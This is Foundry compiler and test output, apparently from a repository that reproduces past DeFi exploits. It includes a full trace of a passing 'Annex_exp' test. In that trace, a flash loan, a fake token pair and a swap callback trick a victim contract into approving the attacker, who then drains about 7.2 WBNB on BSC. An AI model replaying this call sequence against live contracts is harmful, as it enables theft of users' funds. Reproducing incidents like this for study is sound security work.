Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.27s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/Annex_exp.sol:13:5:
   |
13 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/Annex_exp.sol:65:5:
   |
65 |     function liquidateBorrow(
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/Annex_exp.sol:73:5:
   |
73 |     function balanceOf(address account) external returns (uint256) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/Annex_exp.sol:77:5:
   |
77 |     function redeem(uint256 redeemTokens) external returns (uint256) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 275.79ms (236.59µs CPU time)

Ran 1 test for src/test/2022-11/Annex_exp.sol:ContractTest
[PASS] testExploit() (gas: 4264995)
Logs:
  [End] Attacker WBNB balance after exploit: 7.222370557374026863

Traces:
  [4394795] ContractTest::testExploit()
    ├─ [424228] → new MyERC20@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 1783 bytes of code
    ├─ [46628] MyERC20::mint(10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000000000000000000 [1e19])
    │   └─ ← [Stop] 
    ├─ [3861996] 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681::flashLoan(8000000000000000000 [8e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [29962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8000000000000000000 [8e18])
    │   │   ├─ emit Transfer(from: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8000000000000000000 [8e18])
    │   │   └─ ← [Return] true
    │   ├─ [3803191] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8000000000000000000 [8e18], 0, 0x00)
    │   │   ├─ [24523] MyERC20::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3442201] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidity(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 8000000000000000000 [8e18], 8000000000000000000 [8e18], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1668786616 [1.668e9])
    │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   ├─ [3223393] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::createPair(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)
    │   │   │   │   ├─ [3066434] → new <unknown>@0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3
    │   │   │   │   │   └─ ← [Return] 14981 bytes of code
    │   │   │   │   ├─ [44840] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::initialize(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit PairCreated(token0: MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], token1: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, pair: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, : 1176649 [1.176e6])
    │   │   │   │   └─ ← [Return] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3
    │   │   │   ├─ [2893] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 0, 0, 0
    │   │   │   ├─ [25614] MyERC20::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, 8000000000000000000 [8e18])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, value: 8000000000000000000 [8e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [25325] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, 8000000000000000000 [8e18])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, value: 8000000000000000000 [8e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [153020] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   ├─ [541] MyERC20::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 8000000000000000000 [8e18]
    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 8000000000000000000 [8e18]
    │   │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000000, value: 1000)
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7999999999999999000 [7.999e18])
    │   │   │   │   ├─ emit Sync(reserve0: 8000000000000000000 [8e18], reserve1: 8000000000000000000 [8e18])
    │   │   │   │   ├─ emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 8000000000000000000 [8e18], amount1: 8000000000000000000 [8e18])
    │   │   │   │   └─ ← [Return] 7999999999999999000 [7.999e18]
    │   │   │   └─ ← [Return] 8000000000000000000 [8e18], 8000000000000000000 [8e18], 7999999999999999000 [7.999e18]
    │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    │   │   │   └─ ← [Return] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3
    │   │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xe65E970F065643bA80E5822edfF483A1d75263E3) [staticcall]
    │   │   │   └─ ← [Return] 7225851763293057027 [7.225e18]
    │   │   ├─ [465] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::token0() [staticcall]
    │   │   │   └─ ← [Return] MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   ├─ [79771] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::swap(0, 7225851763293057027 [7.225e18], 0xe65E970F065643bA80E5822edfF483A1d75263E3, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   │   ├─ [6062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xe65E970F065643bA80E5822edfF483A1d75263E3, 7225851763293057027 [7.225e18])
    │   │   │   │   ├─ emit Transfer(from: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, to: 0xe65E970F065643bA80E5822edfF483A1d75263E3, value: 7225851763293057027 [7.225e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [38426] 0xe65E970F065643bA80E5822edfF483A1d75263E3::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 7225851763293057027 [7.225e18], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   │   │   ├─ [465] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::token0() [staticcall]
    │   │   │   │   │   └─ ← [Return] MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   │   │   ├─ [397] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::token1() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3
    │   │   │   │   ├─ [2717] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::allowance(0xe65E970F065643bA80E5822edfF483A1d75263E3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [22320] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7225851763293057027 [7.225e18])
    │   │   │   │   │   ├─ emit Approval(owner: 0xe65E970F065643bA80E5822edfF483A1d75263E3, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7225851763293057027 [7.225e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [565] ContractTest::liquidateBorrow(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7225851763293057027 [7.225e18], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [416] ContractTest::balanceOf(0xe65E970F065643bA80E5822edfF483A1d75263E3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [318] ContractTest::redeem(0)
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, 7247594546933858603 [7.247e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0xe65E970F065643bA80E5822edfF483A1d75263E3, to: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, value: 7247594546933858603 [7.247e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [541] MyERC20::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   └─ ← [Return] 8000000000000000000 [8e18]
    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   └─ ← [Return] 8021742783640801576 [8.021e18]
    │   │   │   ├─ emit Sync(reserve0: 8000000000000000000 [8e18], reserve1: 8021742783640801576 [8.021e18])
    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 7247594546933858603 [7.247e18], amount0Out: 0, amount1Out: 7225851763293057027 [7.225e18], to: 0xe65E970F065643bA80E5822edfF483A1d75263E3)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [24598] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [537] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 7999999999999999000 [7.999e18]
    │   │   ├─ [133075] 0x10ED43C718714eb63d5aA57B78B54704E256024E::removeLiquidity(MyERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 7999999999999999000 [7.999e18], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1668786616 [1.668e9])
    │   │   │   ├─ [25476] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, 7999999999999999000 [7.999e18])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, value: 7999999999999999000 [7.999e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [105242] 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   ├─ [541] MyERC20::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 8000000000000000000 [8e18]
    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 8021742783640801576 [8.021e18]
    │   │   │   │   ├─ [354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 3473277478201978 [3.473e15])
    │   │   │   │   ├─ emit Transfer(from: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, to: 0x0000000000000000000000000000000000000000, value: 7999999999999999000 [7.999e18])
    │   │   │   │   ├─ [3132] MyERC20::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7996528229824442054 [7.996e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7996528229824442054 [7.996e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8018261577721771412 [8.018e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8018261577721771412 [8.018e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [541] MyERC20::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 3471770175557946 [3.471e15]
    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd0604cb5797Db2Eda79B82d13586F1eDd9de65a3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 3481205919030164 [3.481e15]
    │   │   │   │   ├─ emit Sync(reserve0: 3471770175557946 [3.471e15], reserve1: 3481205919030164 [3.481e15])
    │   │   │   │   ├─ emit Burn(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 7996528229824442054 [7.996e18], amount1: 8018261577721771412 [8.018e18], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Return] 7996528229824442054 [7.996e18], 8018261577721771412 [8.018e18]
    │   │   │   └─ ← [Return] 7996528229824442054 [7.996e18], 8018261577721771412 [8.018e18]
    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xe65E970F065643bA80E5822edfF483A1d75263E3) [staticcall]
    │   │   │   └─ ← [Return] 7204108979652255451 [7.204e18]
    │   │   ├─ [4148] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xe65E970F065643bA80E5822edfF483A1d75263E3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7204108979652255451 [7.204e18])
    │   │   │   ├─ emit Transfer(from: 0xe65E970F065643bA80E5822edfF483A1d75263E3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7204108979652255451 [7.204e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, 8000000000000000000 [8e18])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, value: 8000000000000000000 [8e18])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    │   │   └─ ← [Return] 726108929873673402335 [7.261e20]
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    │   │   └─ ← [Return] 663807078680177707798721 [6.638e23]
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    │   │   └─ ← [Return] 726108929873673402335 [7.261e20]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    │   │   └─ ← [Return] 663807078680177707798721 [6.638e23]
    │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 8000000000000000000 [8e18], : 0)
    │   └─ ← [Stop] 
    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 7222370557374026863 [7.222e18]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 7222370557374026863 [7.222e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 278.06ms (2.68ms CPU time)

Ran 2 test suites in 556.39ms (553.85ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
